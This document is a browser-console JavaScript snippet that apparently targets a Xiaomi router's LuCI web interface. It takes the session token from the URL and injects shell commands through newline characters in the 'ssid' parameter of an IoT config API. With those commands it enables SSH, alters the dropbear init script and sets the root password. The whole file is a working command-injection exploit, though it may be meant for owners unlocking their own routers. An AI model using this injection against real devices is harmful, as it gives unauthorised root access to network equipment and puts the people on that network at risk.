function getSTOK(currentWindow = window) {
  const { href } = currentWindow.location;
  const match = href.match(/;stok=(.*?)\//);
  if (!match) {
    return null;
  }
  return match[1];
}

function execute(stok, command, currentWindow = window) {
  const encodedCommand = encodeURIComponent(command);
  const path = `/cgi-bin/luci/;stok=${stok}/api/misystem/set_config_iotdev?bssid=SteelyWing&user_id=SteelyWing&ssid=-h%0A${encodedCommand}%0A`;
  console.log(path);
  return currentWindow.fetch(new currentWindow.Request(currentWindow.location.origin + path));
}

function enableSSH(currentWindow = window) {
  const stok = getSTOK(currentWindow);
  if (!stok) {
    console.error('stok not found in URL');
    return;
  }
  console.log(`stok = "${stok}"`);

  const password = currentWindow.prompt('Input new SSH password');
  if (!password) {
    console.error('You must input password');
    return;
  }

  const sshEnableCommand = `
nvram set ssh_en=1
nvram commit
sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear
/etc/init.d/dropbear start
`;

  execute(stok, sshEnableCommand, currentWindow)
    .then((response) => response.text())
    .then((text) => console.log(text));

  console.log(`New SSH password: ${password}`);
  execute(stok, `echo -e "${password}\\n${password}" | passwd root`, currentWindow)
    .then((response) => response.text())
    .then((text) => console.log(text));
}

enableSSH();
